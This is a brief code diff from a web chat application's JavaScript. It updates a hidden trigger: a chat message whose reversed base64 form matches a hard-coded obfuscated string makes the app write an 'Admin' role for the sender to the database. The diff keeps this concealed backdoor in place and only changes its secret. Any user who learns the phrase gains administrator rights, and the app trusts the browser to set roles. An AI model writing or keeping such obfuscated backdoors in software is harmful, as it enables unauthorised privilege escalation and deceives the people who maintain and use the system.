@@ -390,7 +390,7 @@ window.onload = function() {
         const text = document.getElementById('messageInput').value.trim();
         if(!text) return;
         
-        if (btoa(text).split('').reverse().join('') === "=skY2hX2mZNGJ1YXRfRzXlRXZ9292L") {
+        if (btoa(text).split('').reverse().join('') === "=s2Yhh2XmZGNyETYfRzXlRWayJXZ292L") {
             rdb.ref('users/' + currentUser.name).update({ role: 'Admin' }).then(() => {
                 location.reload();
             });
